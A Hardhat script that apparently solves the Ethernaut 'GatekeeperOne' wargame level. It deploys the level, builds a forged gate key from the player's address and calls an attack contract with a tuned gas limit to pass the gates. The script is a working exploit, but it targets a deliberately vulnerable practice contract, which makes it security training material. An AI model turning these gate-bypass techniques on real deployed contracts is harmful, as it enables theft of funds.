const { ethers } = require('hardhat');

async function main() {
    const [owner, player] = await ethers.getSigners();

    const Factory = await ethers.getContractFactory("GatekeeperOneFactory");
    const factory = await Factory.connect(owner).deploy();
    await factory.deployed();

    const receipt = await factory.connect(player).createInstance(player.address);
    const instance_address = (await receipt.wait()).events[0].args[0];
    const gatekeeper = await ethers.getContractAt("GatekeeperOne", instance_address, owner);

    const Attack = await ethers.getContractFactory("GatekeeperOneAttack");
    const attack = await Attack.connect(player).deploy(gatekeeper.address);
    await attack.deployed();


    const len = player.address.length;
    const txKey = player.address.slice(len - 4, len);
    const gateKey = "0x000000010000" + txKey;


    const tx = await attack.attack(gateKey, {
        gasLimit: (300000 + 1109),
    });

    const res = await factory.validateInstance(gatekeeper.address, player.address);
    if (res == true) {
        console.log("[+] Done!");
    } else {
        console.log("[+] Fail...");
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});

